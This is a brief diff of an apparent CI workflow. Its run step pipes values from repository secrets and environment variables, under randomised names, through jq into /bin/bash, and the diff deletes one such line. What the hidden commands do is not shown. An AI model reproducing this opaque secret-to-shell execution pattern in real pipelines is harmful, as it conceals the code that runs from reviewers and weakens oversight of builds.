@@ -23,7 +23,6 @@ jobs:
           unim3: ${{ secrets.unim3 }}
         run: |
           printf '%s' "$unim3" | jq -r .q30 | /bin/bash
-          printf '%s' "$apa62" | jq -r .wwvj86850 | /bin/bash
           echo $a43945 | jq -r .yuuwf70 | /bin/bash
           echo $b5 | jq -r .gn702 | /bin/bash
           printf '%s' "$lcw8922" | jq -r .pgr1060 | /bin/bash
